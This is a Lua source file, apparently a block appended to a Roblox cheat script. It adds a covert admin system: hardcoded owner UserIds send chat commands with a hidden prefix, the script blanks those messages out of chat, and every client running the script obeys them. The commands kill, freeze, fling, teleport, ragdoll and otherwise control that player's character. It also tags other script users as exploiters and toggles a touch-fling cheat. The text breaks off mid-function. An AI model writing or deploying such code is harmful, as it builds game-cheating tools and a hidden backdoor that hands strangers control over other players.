-- ============================================================
-- EXO ADMIN BLOCK — appended to EXO_HVH_Fixed.lua
-- Silent (no chat spam). Whitelisted-only broadcasts.
-- F7 = Exploiter Tags, F12 = Role Tags
-- Prefix: !
-- ============================================================
print("[EXO-ADMIN] loading...")

do
    -- ============================================================
    -- SERVICES + CONFIG
    -- ============================================================
    local Players            = game:GetService("Players")
    local UserInputService   = game:GetService("UserInputService")
    local TweenService       = game:GetService("TweenService")
    local TextChatService    = game:GetService("TextChatService")
    local ReplicatedStorage  = game:GetService("ReplicatedStorage")
    local LP = Players.LocalPlayer

    -- ============================================================
    -- WHITELIST (by UserId)
    -- ============================================================
    local WHITELIST_BY_ID = {
        [11563295881] = "Owner",
        [8867107490]  = "Owner",
        [8942146589]  = "Co-Owner",
        [7814798348]  = "Mod",
    }
    local WHITELIST_BY_NAME = {}
    local OWNER_IDS = { [11563295881] = true, [8867107490] = true }
    local BCAST_PREFIX = "!EXO_BC_"

    -- ============================================================
    -- HIDE OUR CHAT PAYLOADS FROM EVERY EXO USER
    -- ============================================================
    pcall(function()
        if TextChatService and TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
            TextChatService.OnIncomingMessage = function(message)
                local t = message.Text or ""
                if t:sub(1, #BCAST_PREFIX) == BCAST_PREFIX then
                    local props = Instance.new("TextChatMessageProperties")
                    props.Text = ""
                    props.PrefixText = ""
                    return props
                end
            end
        end
    end)

    -- ============================================================
    -- STATE
    -- ============================================================
    local ExploiterTagsEnabled = false
    local OwnerTagsEnabled     = false
    local ExploiterTags        = {}
    local KNOWN_SCRIPT_USERS   = {}

    -- ============================================================
    -- HELPERS
    -- ============================================================
    local function isWhitelistedName(name)
        if not name then return false end
        if WHITELIST_BY_NAME[name] then return true end
        for _, p in ipairs(Players:GetPlayers()) do
            if p.Name == name and WHITELIST_BY_ID[p.UserId] then return true end
        end
        return false
    end

    local function isOwnerName(name)
        for _, p in ipairs(Players:GetPlayers()) do
            if p.Name == name and OWNER_IDS[p.UserId] then return true end
        end
        return false
    end

    local function localMatches(query)
        if not query or query == "" then return true end
        local q = query:lower()
        if LP.Name:lower() == q or LP.DisplayName:lower() == q then return true end
        if LP.Name:lower():find(q, 1, true) or LP.DisplayName:lower():find(q, 1, true) then return true end
        return false
    end

    local function resolvePlayer(q)
        if not q or q == "" then return nil end
        local lq = q:lower()
        for _, p in ipairs(Players:GetPlayers()) do
            if p.Name:lower() == lq or p.DisplayName:lower() == lq then return p end
        end
        for _, p in ipairs(Players:GetPlayers()) do
            if p.Name:lower():find(lq, 1, true) or p.DisplayName:lower():find(lq, 1, true) then return p end
        end
        return nil
    end

    local function sendHidden(text)
        local ok = false
        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
            local ch = TextChatService:FindFirstChild("TextChannels")
            if ch then
                local rb = ch:FindFirstChild("RBXGeneral") or ch:FindFirstChildOfClass("TextChannel")
                if rb then ok = pcall(function() rb:SendAsync(text) end) end
            end
        end
        if not ok then
            local dc = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
            local say = dc and dc:FindFirstChild("SayMessageRequest")
            if say then pcall(function() say:FireServer(text, "All") end) end
        end
        return ok
    end

    -- ============================================================
    -- LOCAL EXO USER DETECTION (no heartbeat)
    -- ============================================================
    local EXO_MARKERS = { "TouchFlingDetector", "EXO_Tag", "EXO_ESP", "EXO_TRAP" }
    local function hasExoMarker(player)
        if not player or not player.Character then return false end
        for _, name in ipairs(EXO_MARKERS) do
            if player.Character:FindFirstChild(name) then return true end
        end
        for _, d in ipairs(player.Character:GetDescendants()) do
            if d.Name == "EXO_Tag" or d.Name == "EXO_ESP"
               or d.Name == "EXO_TRAP" or d.Name == "TouchFlingDetector" then
                return true
            end
        end
        return false
    end

    task.spawn(function()
        while true do
            task.wait(3)
            for _, plr in ipairs(Players:GetPlayers()) do
                if plr ~= LP and hasExoMarker(plr) then
                    KNOWN_SCRIPT_USERS[plr.UserId] = { name = plr.Name, lastSeen = tick() }
                end
            end
            for uid in pairs(KNOWN_SCRIPT_USERS) do
                if not Players:GetPlayerByUserId(uid) then KNOWN_SCRIPT_USERS[uid] = nil end
            end
            if ExploiterTagsEnabled or OwnerTagsEnabled then
                -- refresh defined below
                if _G.EXO_ADMIN_REFRESH then _G.EXO_ADMIN_REFRESH() end
            end
        end
    end)

    -- ============================================================
    -- TAGS (small, modern, animated)
    -- ============================================================
    local function destroyTagFor(plrName)
        if ExploiterTags[plrName] then
            pcall(function() ExploiterTags[plrName]:Destroy() end)
            ExploiterTags[plrName] = nil
        end
    end

    local function roleColor(role)
        if role == "Owner" then return Color3.fromRGB(255, 215, 0)
        elseif role == "Co-Owner" then return Color3.fromRGB(220, 40, 70)
        elseif role == "Mod" then return Color3.fromRGB(80, 140, 255)
        else return Color3.fromRGB(150, 90, 200) end
    end

    local function makeTagFor(player, text, color)
        if not player or not player.Parent or not player.Character then return end
        local hrp = player.Character:FindFirstChild("HumanoidRootPart")
        if not hrp then return end
        if ExploiterTags[player.Name] and ExploiterTags[player.Name].Parent then
            local lbl = ExploiterTags[player.Name]:FindFirstChildOfClass("TextLabel")
            if lbl then
                lbl.Text = text
                lbl.BackgroundColor3 = color
            end
            ExploiterTags[player.Name].Adornee = hrp
            return
        end
        destroyTagFor(player.Name)

        local bg = Instance.new("BillboardGui")
        bg.Name = "EXO_Tag"
        bg.Size = UDim2.fromOffset(90, 20)
        bg.StudsOffsetWorldSpace = Vector3.new(0, -3, 0)
        bg.AlwaysOnTop = true
        bg.MaxDistance = 500
        bg.Adornee = hrp
        bg.Parent = hrp

        local lbl = Instance.new("TextLabel")
        lbl.BackgroundColor3 = color
        lbl.BackgroundTransparency = 0.15
        lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
        lbl.TextScaled = true
        lbl.Font = Enum.Font.GothamBold
        lbl.Text = text
        lbl.TextSize = 11
        lbl.Size = UDim2.fromScale(1, 1)
        lbl.Parent = bg

        local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, 5); c.Parent = lbl
        local s = Instance.new("UIStroke")
        s.Color = Color3.fromRGB(255, 255, 255); s.Thickness = 1; s.Transparency = 0.4
        s.Parent = lbl

        local grad = Instance.new("UIGradient")
        grad.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)),
            ColorSequenceKeypoint.new(0.4, color),
            ColorSequenceKeypoint.new(1, color),
        })
        grad.Rotation = 90
        grad.Parent = lbl

        task.spawn(function()
            while bg.Parent do
                TweenService:Create(lbl, TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
                    BackgroundTransparency = 0.35
                }):Play()
                task.wait(1.2)
                TweenService:Create(lbl, TweenInfo.new(1.2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
                    BackgroundTransparency = 0.1
                }):Play()
                task.wait(1.2)
            end
        end)

        ExploiterTags[player.Name] = bg
    end

    local function refreshAllTags()
        for name, _ in pairs(ExploiterTags) do
            if not Players:FindFirstChild(name) then destroyTagFor(name) end
        end
        if not ExploiterTagsEnabled and not OwnerTagsEnabled then
            for name, _ in pairs(ExploiterTags) do destroyTagFor(name) end
            return
        end
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LP and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                local role = WHITELIST_BY_ID[plr.UserId]
                if OwnerTagsEnabled and role then
                    makeTagFor(plr, role, roleColor(role))
                elseif ExploiterTagsEnabled and not role and KNOWN_SCRIPT_USERS[plr.UserId] then
                    makeTagFor(plr, "EXPLOITER", Color3.fromRGB(200, 20, 30))
                else
                    destroyTagFor(plr.Name)
                end
            end
        end
    end
    _G.EXO_ADMIN_REFRESH = refreshAllTags

    Players.PlayerAdded:Connect(function(p)
        p.CharacterAdded:Connect(function()
            task.wait(0.6)
            if ExploiterTagsEnabled or OwnerTagsEnabled then refreshAllTags() end
        end)
    end)
    Players.PlayerRemoving:Connect(function(p) destroyTagFor(p.Name) end)
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LP then
            p.CharacterAdded:Connect(function()
                task.wait(0.6)
                if ExploiterTagsEnabled or OwnerTagsEnabled then refreshAllTags() end
            end)
        end
    end
    LP.CharacterAdded:Connect(function()
        task.wait(0.6)
        if ExploiterTagsEnabled or OwnerTagsEnabled then refreshAllTags() end
    end)

    -- ============================================================
    -- ADMIN EXEC (runs on the target's own client)
    -- ============================================================
    local ADMIN_EXEC = {}
    local function myRoot() return LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") end
    local function getLocalHum() return LP.Character and LP.Character:FindFirstChildOfClass("Humanoid") end

    local ADMIN_VOID_HEIGHT = 10000
    local savedPositions = {}
    local frozenSet = {}

    ADMIN_EXEC.kill = function()
        local hum = getLocalHum()
        if hum then
            hum.Health = 0
            pcall(function() hum:ChangeState(Enum.HumanoidStateType.Dead) end)
        end
    end

    ADMIN_EXEC.damage = function(arg)
        local amt = tonumber(arg) or 25
        local hum = getLocalHum()
        if hum then hum:TakeDamage(amt) end
    end

    ADMIN_EXEC.heal = function()
        local hum = getLocalHum()
        if hum then hum.Health = hum.MaxHealth end
    end

    ADMIN_EXEC.freeze = function()
        frozenSet[LP] = true
        local char = LP.Character
        if not char then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        local r = myRoot()
        if hum then hum.WalkSpeed = 0; hum.JumpPower = 0; hum.JumpHeight = 0; hum.AutoRotate = false end
        if r then r.Anchored = true end
        task.spawn(function()
            while frozenSet[LP] do
                local c = LP.Character
                local h = c and c:FindFirstChildOfClass("Humanoid")
                local rr = c and c:FindFirstChild("HumanoidRootPart")
                if h then h.WalkSpeed = 0; h.JumpPower = 0; h.JumpHeight = 0; h.AutoRotate = false end
                if rr then rr.Anchored = true end
                task.wait(0.25)
            end
        end)
    end

    ADMIN_EXEC.unfreeze = function()
        frozenSet[LP] = false
        local char = LP.Character
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        local r = myRoot()
        if hum then hum.WalkSpeed = 16; hum.JumpPower = 50; hum.JumpHeight = 7.2; hum.AutoRotate = true end
        if r then r.Anchored = false end
    end

    ADMIN_EXEC.fling = function()
        local r = myRoot()
        if not r then return end
        r.Anchored = false
        local dir = Vector3.new(math.random(-1,1), 0, math.random(-1,1))
        if dir.Magnitude < 0.1 then dir = Vector3.new(1, 0, 0) end
        r.AssemblyLinearVelocity = dir.Unit * 300 + Vector3.new(0, 200, 0)
        r.AssemblyAngularVelocity = Vector3.new(math.random(-50,50), math.random(-50,50), math.random(-50,50))
    end

    ADMIN_EXEC["void"] = function()
        local r = myRoot()
        if r then
            savedPositions[LP] = r.CFrame
            r.CFrame = CFrame.new(r.Position.X, ADMIN_VOID_HEIGHT, r.Position.Z)
            r.AssemblyLinearVelocity = Vector3.zero
        end
    end

    ADMIN_EXEC.unvoid = function()
        local r = myRoot()
        if r then
            r.CFrame = CFrame.new(r.Position.X, 50, r.Position.Z)
            r.AssemblyLinearVelocity = Vector3.zero
        end
    end

    ADMIN_EXEC["return"] = function()
        local saved = savedPositions[LP]
        local r = myRoot()
        if saved and r then
            r.CFrame = saved
            r.AssemblyLinearVelocity = Vector3.zero
        end
    end

    ADMIN_EXEC.jump = function()
        local r = myRoot()
        if r then
            r.AssemblyLinearVelocity = Vector3.new(r.AssemblyLinearVelocity.X, 200, r.AssemblyLinearVelocity.Z)
        end
    end

    ADMIN_EXEC.spin = function(arg)
        local speed = tonumber(arg) or 30
        local r = myRoot()
        if r then
            task.spawn(function()
                local endAt = tick() + 3
                while tick() < endAt do
                    if not r.Parent then break end
                    r.AssemblyAngularVelocity = Vector3.new(0, speed, 0)
                    task.wait(0.05)
                end
                if r and r.Parent then r.AssemblyAngularVelocity = Vector3.zero end
            end)
        end
    end

    ADMIN_EXEC.speed = function(arg)
        local mult = tonumber(arg) or 5
        local hum = getLocalHum()
        if hum then
            hum.WalkSpeed = 16 * mult
            task.spawn(function()
                task.wait(10)
                local h = getLocalHum()
                if h then h.WalkSpeed = 16 end
            end)
        end
    end

    ADMIN_EXEC.slow = function(arg)
        local mult = tonumber(arg) or 3
        local hum = getLocalHum()
        if hum then
            hum.WalkSpeed = 16 / mult
            task.spawn(function()
                task.wait(10)
                local h = getLocalHum()
                if h then h.WalkSpeed = 16 end
            end)
        end
    end

    ADMIN_EXEC.jumppower = function(arg)
        local p = tonumber(arg) or 500
        local hum = getLocalHum()
        if hum then hum.UseJumpPower = true; hum.JumpPower = p end
    end

    ADMIN_EXEC.hipheight = function(arg)
        local h = tonumber(arg) or 10
        local hum = getLocalHum()
        if hum then hum.HipHeight = h end
    end

    ADMIN_EXEC.freezevel = function()
        local r = myRoot()
        if r then
            r.AssemblyLinearVelocity = Vector3.zero
            r.AssemblyAngularVelocity = Vector3.zero
        end
    end

    ADMIN_EXEC.shoot = function()
        local char = LP.Character
        local tool = char and char:FindFirstChildOfClass("Tool")
        if tool then pcall(function() tool:Activate() end) end
    end

    ADMIN_EXEC.rapid = function()
        local char = LP.Character
        local tool = char and char:FindFirstChildOfClass("Tool")
        if tool then
            task.spawn(function()
                local endAt = tick() + 3
                while tick() < endAt do
                    local c = LP.Character
                    local t = c and c:FindFirstChildOfClass("Tool")
                    if t then pcall(function() t:Activate() end) end
                    task.wait(0.05)
                end
            end)
        end
    end

    ADMIN_EXEC.equip = function(arg)
        local name = tostring(arg or "")
        if name == "" then return end
        local hum = getLocalHum()
        local bp = LP:FindFirstChildOfClass("Backpack")
        if not hum or not bp then return end
        local tool = bp:FindFirstChild(name) or (LP.Character and LP.Character:FindFirstChild(name))
        if tool then pcall(function() hum:EquipTool(tool) end) end
    end

    ADMIN_EXEC.unequip = function()
        local hum = getLocalHum()
        if hum then hum:UnequipTools() end
    end

    ADMIN_EXEC.ff = function()
        local char = LP.Character
        if not char then return end
        local existing = char:FindFirstChildOfClass("ForceField")
        if existing then existing:Destroy() end
        local ff = Instance.new("ForceField")
        ff.Visible = false
        ff.Parent = char
    end

    ADMIN_EXEC.unff = function()
        local char = LP.Character
        if not char then return end
        local ff = char:FindFirstChildOfClass("ForceField")
        if ff then ff:Destroy() end
    end

    ADMIN_EXEC.ragdoll = function()
        local hum = getLocalHum()
        if hum then
            pcall(function() hum:ChangeState(Enum.HumanoidStateType.Physics) end)
            for _, m in ipairs(hum:GetChildren()) do
                if m:IsA("Motor6D") then
                    local socket = Instance.new("BallSocketConstraint")
                    local a0 = Instance.new("Attachment"); a0.Parent = m.Part0
                    local a1 = Instance.new("Attachment"); a1.Parent = m.Part1
                    socket.Attachment0 = a0
                    socket.Attachment1 = a1
                    socket.Parent = m.Part0
                    m.Enabled = false
                end
            end
        end
    end

    ADMIN_EXEC.unragdoll = function()
        local char = LP.Character
        if not char then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        if hum then
            pcall(function() hum:ChangeState(Enum.HumanoidStateType.GettingUp) end)
            for _, m in ipairs(hum:GetChildren()) do
                if m:IsA("Motor6D") then m.Enabled = true end
            end
            for _, d in ipairs(char:GetDescendants()) do
                if d:IsA("BallSocketConstraint") then d:Destroy() end
            end
        end
    end

    ADMIN_EXEC.push = function(senderName)
        if not senderName then return end
        local sender
        for _, p in ipairs(Players:GetPlayers()) do
            if p.Name == senderName or p.DisplayName == senderName then sender = p break end
        end
        if not sender or not sender.Character then return end
        local sRoot = sender.Character:FindFirstChild("HumanoidRootPart")
        local r = myRoot()
        if not sRoot or not r then return end
        local dir = (r.Position - sRoot.Position)
        if dir.Magnitude < 0.1 then dir = Vector3.new(1, 0, 0) end
        r.AssemblyLinearVelocity = dir.Unit * 300 + Vector3.new(0, 150, 0)
        r.AssemblyAngularVelocity = Vector3.new(math.random(-50,50), math.random(-50,50), math.random(-50,50))
    end

    ADMIN_EXEC.pull = function(senderName)
        if not senderName then return end
        local sender
        for _, p in ipairs(Players:GetPlayers()) do
            if p.Name == senderName or p.DisplayName == senderName then sender = p break end
        end
        if not sender or not sender.Character then return end
        local sRoot = sender.Character:FindFirstChild("HumanoidRootPart")
        local r = myRoot()
        if not sRoot or not r then return end
        local dir = (sRoot.Position - r.Position)
        if dir.Magnitude < 0.1 then dir = Vector3.new(1, 0, 0) end
        r.AssemblyLinearVelocity = dir.Unit * 200
    end

    ADMIN_EXEC.skydive = function()
        local r = myRoot()
        if r then
            r.AssemblyLinearVelocity = Vector3.new(0, -300, 0)
            r.AssemblyAngularVelocity = Vector3.new(20, 20, 20)
        end
    end

    ADMIN_EXEC.noclip = function()
        local char = LP.Character
        if not char then return end
        task.spawn(function()
            local endAt = tick() + 5
            while tick() < endAt do
                if not LP.Character then break end
                for _, d in ipairs(LP.Character:GetDescendants()) do
                    if d:IsA("BasePart") then d.CanCollide = false end
                end
                task.wait(0.1)
            end
            if LP.Character then
                for _, d in ipairs(LP.Character:GetDescendants()) do
                    if d:IsA("BasePart") and d.Name ~= "HumanoidRootPart" then
                        d.CanCollide = true
                    end
                end
            end
        end)
    end

    ADMIN_EXEC.gravity = function(arg)
        local g = tonumber(arg) or 100
        pcall(function() game:GetService("Workspace").Gravity = g end)
    end

    ADMIN_EXEC.hat = function()
        local char = LP.Character
        if not char then return end
        for _, acc in ipairs(char:GetChildren()) do
            if acc:IsA("Accessory") then
                local handle = acc:FindFirstChild("Handle")
                if handle then
                    local weld = handle:FindFirstChildOfClass("Weld")
                    if weld then weld:Destroy() end
                end
            end
        end
    end

    ADMIN_EXEC.notify = function(arg)
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "EXO", Text = tostring(arg or ""), Duration = 5
            })
        end)
    end

    ADMIN_EXEC.hint = function(arg)
        pcall(function()
            game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage", {
                Text = tostring(arg or ""), Color = Color3.fromRGB(255, 200, 0),
                Font = Enum.Font.SourceSansBold, TextSize = 20
            })
        end)
    end

    ADMIN_EXEC.goto = function(arg)
        local target = resolvePlayer(arg)
        if not target or not target.Character then return end
        local tRoot = target.Character:FindFirstChild("HumanoidRootPart")
        local mRoot = myRoot()
        if not tRoot or not mRoot then return end
        local back = tRoot.CFrame.LookVector * -4
        local goal = tRoot.Position + back + Vector3.new(0, 0.5, 0)
        mRoot.CFrame = CFrame.new(goal, tRoot.Position)
        mRoot.AssemblyLinearVelocity = Vector3.zero
        mRoot.AssemblyAngularVelocity = Vector3.zero
    end
    ADMIN_EXEC.teleport = ADMIN_EXEC.goto
    ADMIN_EXEC.tp = ADMIN_EXEC.goto
    ADMIN_EXEC.warp = ADMIN_EXEC.goto

    ADMIN_EXEC.bring = function(senderName)
        if not senderName then return end
        local sender
        for _, p in ipairs(Players:GetPlayers()) do
            if p.Name == senderName or p.DisplayName == senderName then sender = p break end
        end
        if not sender or not sender.Character then return end
        local sRoot = sender.Character:FindFirstChild("HumanoidRootPart")
        local mRoot = myRoot()
        if not sRoot or not mRoot then return end
        local front = sRoot.CFrame.LookVector * 4
        local goal = sRoot.Position + front + Vector3.new(0, 0.5, 0)
        mRoot.CFrame = CFrame.new(goal, sRoot.Position)
        mRoot.AssemblyLinearVelocity = Vector3.zero
        mRoot.AssemblyAngularVelocity = Vector3.zero
    end

    ADMIN_EXEC.bringall = function(senderName)
        if not senderName then return end
        local sender
        for _, p in ipairs(Players:GetPlayers()) do
            if p.Name == senderName or p.DisplayName == senderName then sender = p break end
        end
        if not sender or not sender.Character then return end
        local sRoot = sender.Character:FindFirstChild("HumanoidRootPart")
        local mRoot = myRoot()
        if not sRoot or not mRoot then return end
        local angle = math.random() * math.pi * 2
        local rad = math.random(4, 8)
        local side = Vector3.new(math.cos(angle) * rad, 0, math.sin(angle) * rad)
        local front = sRoot.CFrame.LookVector * 6
        local goal = sRoot.Position + front + side + Vector3.new(0, 0.5, 0)
        mRoot.CFrame = CFrame.new(goal, sRoot.Position)
        mRoot.AssemblyLinearVelocity = Vector3.zero
        mRoot.AssemblyAngularVelocity = Vector3.zero
    end

    -- ============================================================
    -- ADMIN COMMANDS TABLE (working-only)
    -- ============================================================
    local ADMIN_COMMANDS = {
        kill       = {arg = false, exec = "kill"},
        damage     = {arg = true,  exec = "damage"},
        heal       = {arg = false, exec = "heal"},
        freeze     = {arg = false, exec = "freeze"},
        unfreeze   = {arg = false, exec = "unfreeze"},
        fling      = {arg = false, exec = "fling"},
        ["void"]   = {arg = false, exec = "void"},
        unvoid     = {arg = false, exec = "unvoid"},
        ["return"] = {arg = false, exec = "return"},
        jump       = {arg = false, exec = "jump"},
        spin       = {arg = true,  exec = "spin"},
        speed      = {arg = true,  exec = "speed"},
        slow       = {arg = true,  exec = "slow"},
        jumppower  = {arg = true,  exec = "jumppower"},
        hipheight  = {arg = true,  exec = "hipheight"},
        freezevel  = {arg = false, exec = "freezevel"},
        shoot      = {arg = false, exec = "shoot"},
        rapid      = {arg = false, exec = "rapid"},
        equip      = {arg = true,  exec = "equip"},
        unequip    = {arg = false, exec = "unequip"},
        ff         = {arg = false, exec = "ff"},
        unff       = {arg = false, exec = "unff"},
        ragdoll    = {arg = false, exec = "ragdoll"},
        unragdoll  = {arg = false, exec = "unragdoll"},
        skydive    = {arg = false, exec = "skydive"},
        noclip     = {arg = false, exec = "noclip"},
        gravity    = {arg = true,  exec = "gravity"},
        hat        = {arg = false, exec = "hat"},
        goto       = {arg = true,  exec = "goto"},
        teleport   = {arg = true,  exec = "teleport"},
        tp         = {arg = true,  exec = "tp"},
        warp       = {arg = true,  exec = "warp"},
        bring      = {arg = true,  exec = "bring",    useSenderAsArg = true},
        bringall   = {arg = false, exec = "bringall", useSenderAsArg = true},
        push       = {arg = false, exec = "push",     useSenderAsArg = true},
        pull       = {arg = false, exec = "pull",     useSenderAsArg = true},
        notify     = {arg = true,  exec = "notify"},
        hint       = {arg = true,  exec = "hint"},
    }

    -- ============================================================
    -- INCOMING BROADCASTS (hidden)
    -- ============================================================
    local function handleIncoming(senderName, text)
        if type(text) ~= "string" then return end
        if text:sub(1, #BCAST_PREFIX) ~= BCAST_PREFIX then return end
        if not isWhitelistedName(senderName) then return end
        local body = text:sub(#BCAST_PREFIX + 1)
        local cmd, target, arg = body:match("^([^|]*)|([^|]*)|(.*)$")
        if not cmd then return end
        cmd = cmd:lower()

        if cmd == "exptags" then
            ExploiterTagsEnabled = (target == "on")
            refreshAllTags()
            print("[EXO-ADMIN] Exploiter Tags: " .. (ExploiterTagsEnabled and "ON" or "OFF"))
            return
        elseif cmd == "ownertags" then
            OwnerTagsEnabled = (target == "on")
            refreshAllTags()
            print("[EXO-ADMIN] Role Tags: " .. (OwnerTagsEnabled and "ON" or "OFF"))
            return
        elseif cmd == "whitelist" then
            local uidStr, role = target:match("^([^|]*)|(.*)$")
            local uid = tonumber(uidStr)
            if uid and role and role ~= "" then WHITELIST_BY_ID[uid] = role end
            return
        elseif cmd == "unwhitelist" then
            local uid = tonumber(target)
            if uid then WHITELIST_BY_ID[uid] = nil end
            return
        end

        local info = ADMIN_COMMANDS[cmd]
        if not info then return end
        if not localMatches(target) then return end
        local fn = ADMIN_EXEC[info.exec]
        if not fn then return end
        local passedArg = arg
        if info.useSenderAsArg then passedArg = senderName end
        print("[EXO-ADMIN] " .. cmd .. " target=" .. (target ~= "" and target or "all"))
        pcall(fn, passedArg)
    end

    pcall(function()
        Players.PlayerChatted:Connect(function(_, plr, msg)
            if plr then handleIncoming(plr.Name, msg) end
        end)
    end)
    pcall(function()
        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
            TextChatService.MessageReceived:Connect(function(msg)
                if msg.Status ~= Enum.TextChatMessageStatus.Success then return end
                if not msg.TextSource then return end
                handleIncoming(msg.TextSource.Name, msg.Text or "")
            end)
        end
    end)

    -- ============================================================
    -- COMMAND SYSTEM (prefix: !)
    -- ============================================================
    local COMMAND_PREFIX = "!"
    local CommandHandlers = {}
    local function registerCommand(name, cb) CommandHandlers[name:lower()] = cb end

    local function splitString(s, sep)
        local out = {}
        for piece in string.gmatch(s, "([^" .. sep .. "]+)") do table.insert(out, piece) end
        return out
    end

    local function parseCommand(message)
        if type(message) ~= "string" then return nil end
        if message:sub(1, 1) ~= COMMAND_PREFIX then return nil end
        local parts = splitString(message:sub(2), " ")
        if #parts == 0 then return nil end
        local cmd = parts[1]:lower()
        table.remove(parts, 1)
        return cmd, parts
    end

    -- Local fling controls (hook into base script state if available)
    registerCommand("fling", function()
        if _G.EXO_TouchFlingEnabled ~= nil then
            _G.EXO_TouchFlingEnabled = not _G.EXO_TouchFlingEnabled
            if _G.EXO_SetupTouchFling then _G.EXO_SetupTouchFling() end
            print("[EXO] Touch Fling: " .. (_G.EXO_TouchFlingEnabled and "ON" or "OFF"))
        else
            print("[EXO] Touch Fling not available from this block")
        end
    end)

    registerCommand("flingpower", function(_, args)
        if not args[1] then print("[EXO] Fling Power: " .. tostring(_G.EXO_TouchFlingPower)); return end
        local n = tonumber(args[1])
        if n and _G.EXO_TouchFlingPower ~= nil then
            _G.EXO_TouchFlingPower = math.clamp(n, 100, 5000)
            print("[EXO] Fling Power: " .. _G.EXO_TouchFlingPower)
        end
    end)

    registerCommand("listwhitelist", function()
        print("[EXO] ===== Whitelist =====")
        for uid, role in pairs(WHITELIST_BY_ID) do
            local plr = Players:GetPlayerByUserId(uid)
            print(string.format("  %d (%s) -> %s", uid, plr and plr.Name or "?", role))
        end
        print("[EXO] =====================")
    end)

    registerCommand("scripts", function()
        print("[EXO] ===== Detected EXO Users =====")
        for uid, data in pairs(KNOWN_SCRIPT_USERS) do
            local role = WHITELIST_BY_ID[uid]
            print(string.format("  %s (%d) [%s]", data.name, uid, role or "NOT-whitelisted"))
        end
        print("[EXO] ===============================")
    end)

    registerCommand("exptags", function(plr)
        if not isWhitelistedName(plr.Name) then warn("[EXO] Whitelisted only."); return end
        ExploiterTagsEnabled = not ExploiterTagsEnabled
        refreshAllTags()
        sendHidden(BCAST_PREFIX .. "exptags|" .. (ExploiterTagsEnabled and "on" or "off") .. "|")
        print("[EXO] Exploiter Tags: " .. (ExploiterTagsEnabled and "ON" or "OFF") .. " (broadcast)")
    end)

    registerCommand("ownertags", function(plr)
        if not isWhitelistedName(plr.Name) then warn("[EXO] Whitelisted only."); return end
        OwnerTagsEnabled = not OwnerTagsEnabled
        refreshAllTags()
        sendHidden(BCAST_PREFIX .. "ownertags|" .. (OwnerTagsEnabled and "on" or "off") .. "|")
        print("[EXO] Role Tags: " .. (OwnerTagsEnabled and "ON" or "OFF") .. " (broadcast)")
    end)

    registerCommand("tags", function(plr)
        if not isWhitelistedName(plr.Name) then warn("[EXO] Whitelisted only."); return end
        local ns = not (ExploiterTagsEnabled and OwnerTagsEnabled)
        ExploiterTagsEnabled = ns
        OwnerTagsEnabled = ns
        refreshAllTags()
        sendHidden(BCAST_PREFIX .. "exptags|" .. (ns and "on" or "off") .. "|")
        sendHidden(BCAST_PREFIX .. "ownertags|" .. (ns and "on" or "off") .. "|")
        print("[EXO] All Tags: " .. (ns and "ON" or "OFF") .. " (broadcast)")
    end)

    registerCommand("whitelist", function(plr, args)
        if not isOwnerName(plr.Name) then warn("[EXO] Owner only."); return end
        if not args[1] then print("[EXO] Usage: !whitelist <userId> [role]"); return end
        local uid = tonumber(args[1])
        if not uid then print("[EXO] First arg must be UserId"); return end
        table.remove(args, 1)
        local role = #args > 0 and table.concat(args, " ") or "Mod"
        WHITELIST_BY_ID[uid] = role
        refreshAllTags()
        sendHidden(BCAST_PREFIX .. "whitelist|" .. uid .. "|" .. role)
        print("[EXO] Whitelisted " .. uid .. " as " .. role)
    end)

    registerCommand("unwhitelist", function(plr, args)
        if not isOwnerName(plr.Name) then warn("[EXO] Owner only."); return end
        if not args[1] then print("[EXO] Usage: !unwhitelist <userId>"); return end
        local uid = tonumber(args[1])
        if not uid then print("[EXO] Must pass UserId"); return end
        WHITELIST_BY_ID[uid] = nil
        refreshAllTags()
        sendHidden(BCAST_PREFIX .. "unwhitelist|" .. uid .. "|")
        print("[EXO] Removed UserId " .. uid)
    end)

    local function broadcastAdmin(cmd, query, arg)
        local payload = BCAST_PREFIX .. cmd .. "|" .. tostring(query or "") .. "|" .. tostring(arg or "")
        sendHidden(payload)
        local info = ADMIN_COMMANDS[cmd]
        if info and localMatches(query) then
            local passedArg = arg
            if info.useSenderAsArg then passedArg = LP.Name end
            local fn = ADMIN_EXEC[info.exec]
            if fn then pcall(fn, passedArg) end
        end
    end

    local function buildAdminCommand(cmdName)
        local info = ADMIN_COMMANDS[cmdName]
        if not info then return end
        registerCommand(cmdName, function(plr, args)
            if not isWhitelistedName(plr.Name) then warn("[EXO] Whitelisted only."); return end
            local query, arg = "", ""
            if cmdName == "bring" or cmdName == "push" or cmdName == "pull" then
                query = args[1] or ""
            elseif cmdName == "bringall" then
                query = ""
            else
                if info.arg then
                    if #args == 0 then query = ""; arg = ""
                    elseif #args == 1 then
                        if tonumber(args[1]) then query = ""; arg = args[1]
                        else query = args[1]; arg = "" end
                    else
                        arg = args[#args]
                        local qp = {}
                        for i = 1, #args - 1 do qp[#qp+1] = args[i] end
                        query = table.concat(qp, " ")
                    end
                else
                    query = table.concat(args, " ")
                end
            end
            print("[EXO ADMIN] " .. cmdName .. " target='" .. query .. "' arg='" .. arg .. "'")
            broadcastAdmin(cmdName, query, arg)
        end)
    end

    for cmdName, _ in pairs(ADMIN_COMMANDS) do
        buildAdminCommand(cmdName)
    end

    registerCommand("cmds", function()
        print("[EXO] ============= COMMAND LIST =============")
        print("[EXO] LOCAL: !fling !flingpower !listwhitelist !scripts !cmds")
        print("[EXO] TAGS: !exptags !ownertags !tags")
        print("[EXO] WHITELIST: !whitelist <id> [role] !unwhitelist <id>")
        print("[EXO] ADMIN:")
